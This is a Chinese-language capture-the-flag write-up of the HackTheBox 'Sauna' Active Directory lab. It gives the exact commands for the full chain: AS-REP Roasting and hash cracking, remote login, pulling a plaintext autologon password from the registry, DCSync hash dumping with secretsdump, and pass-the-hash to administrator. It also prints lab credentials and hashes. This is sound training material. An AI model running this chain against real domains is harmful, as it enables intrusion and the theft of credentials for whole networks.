---
title: "HTB Sauna"
description: "HackTheBox篇Active Directory 101系列之Sauna"

date: 2024-07-02T13:42:59+08:00
lastmod: 2025-11-11T09:35:33+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - DnsAdmins
  - DCSync
---
<!--more-->

> 靶机ip：10.10.10.175

# 知识点

* AS-REP Roasting
* DCSync提权
* PTH传递攻击

# 信息收集

## nmap扫描

nmap扫一下

`nmap -sS -sV -sC 10.10.10.175`

![image-20240705135030653](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705135044409-1259975882.png)

发现有`web`服务，`DNS`服务，`Kerberos`服务，`smb`共享服务，`RPC`服务，`LDAP`服务，有AD域

得到一个域名`EGOTISTICAL-BANK.LOCAL`

先简单测试一下

## SMB

尝试匿名登录SMB服务

`smbclient -N -L \\10.10.10.175`

![image-20240705140430156](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705140443576-595990783.png)

匿名登陆成功，但是并无重要信息

## LDAP

尝试使用ldapsearch工具尝试获取域中的用户，根据之前得到的域名`EGOTISTICAL-BANK.LOCAL`构造如下命令

`ldapsearch -x -H ldap://10.10.10.175  -b "dc=Egotistical-bank,dc=local" | grep "dn:"`

![image-20240705141239128](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705141252587-707688598.png)

获取到一个可能叫做`Hugo Smith`的用户

## RPC

尝试`RPC`空账号登录

![image-20240705141714174](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705141727490-1030070414.png)

`RPC`拒绝连接

## WEB

在页面中，找到如下姓名

![image-20240705141516397](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705141529895-1920992009.png)

> Fergus Smith 
>
> Shaun Coins 
>
> Hugo Bear 
>
> Steven Kerb 
>
> Bowie Taylor 
>
> Sophie Driver

## kerbrute用户名枚举

尝试通过`kerbrute`列出使用者，字典使用的是`seclists`

```sh
./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

![image-20240705154247314](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705154300732-2114639653.png)

可以看到有`hsmith`和`fsmith`用户

# AS-REP Roasting



将两个用户名保存到`user.txt`，尝试一下`AS-REP Roasting`攻击

```sh
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt  -dc-ip 10.10.10.175
```

![image-20240705165602974](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705165616305-146200250.png)

拿到`fsmith`用户的`hash`

```txt
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:58bdf4fa347723cb982bdcc37337eb8d$44fdc778d8e0f2346c7d67f5ea08324f2b3db42ec4726705e8c2b13a7bb234f5fcec23542121d7a837f4e9d4cc698f8572eb2e9ba53497d2cffd9d12a25d8db80a52e1d5547344805a85fd9d27ba14fae2dc53467ab6f41887439fde483e0506e3529190a22172243fb9bbece3c21e0f95034100c96a824c57772ee81729d53c699dd9c30c9bf130b33429af8f08aa7c54da5f6d651966bd2235a601c489c9ba37a3ae4d9a9e8166ab978bfa71ee4e4b1d22c6d7a24a6257f2a9302dfc5afc1ccb326a9904bed9f492f3dcae0e68080d7a4a8d0aa2e13a7cf2a4a14982d55cea5d844180e1b1adb490c2f792ea3fb9f4196f23f0f72fe50982c991b0064be0b7
```

使用`john`破解

将上述票据保存为`hash`，使用`john`爆破`hash`值

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

`john hash -show`

![image-20240705170711853](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705170725588-1732545966.png)

拿到`fsmith`的凭证`fsmith:Thestrokes23`

尝试远程登陆

`evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'`

![image-20240705170949902](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705171004310-183933394.png)

登录成功

![image-20240705171651372](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705171705037-1061082570.png)

最后在桌面上拿到`user.txt`

# 注册表获取用户密码

在`Users`目录下发现新用户`svc_loanmgr`

![image-20240706125235716](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240706125236729-1214413985.png)

通过查询`Winlogon`注册表来手动收集信息

`reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"`

![image-20240706130910599](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240706130913738-871033410.png)

拿到用户名密码`svc_loanmanager : Moneymakestheworldgoround!`

但是通过登录发现`svc_loanmanager `登不上，登录`svc_loanmgr`登陆成功

# AD域渗透权限提升

## BloodHound信息搜集

登录`svc_loanmgr`用户

`evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'`

接下来使用`bloodhound`进行信息搜集

```sh
upload /root/htb/Machines/Sauna/SharpHound.exe
./SharpHound.exe
download 20240706064043_BloodHound.zip
```

![image-20240706151302995](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240706151303740-1966923458.png)

分析发现可以利用`DCSync`攻击直接域控

## DCSync提权

使用`secretsdump.py`工具执行 `DCSync` 以转储管理员用户的 `NTLM` 哈希

`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175`

![image-20240706151913724](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240706151914385-627492788.png)

可以看到已经拿到所有用户的`hash`，包括`admin`用户的

## PTH传递攻击获取Root

拿到了管理员的`hash`，就可以通过`wmiexec`哈希传递拿到管理员用户的权限

`python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e EGOTISTICAL-BANK.LOCAL/administrator@10.10.10.175`

![image-20240706152159481](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240706152200125-1504201946.png)

成功拿到管理员用户的权限

![image-20240706152455683](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240706152456281-1524121811.png)

最后在`desktop`获取`root.txt`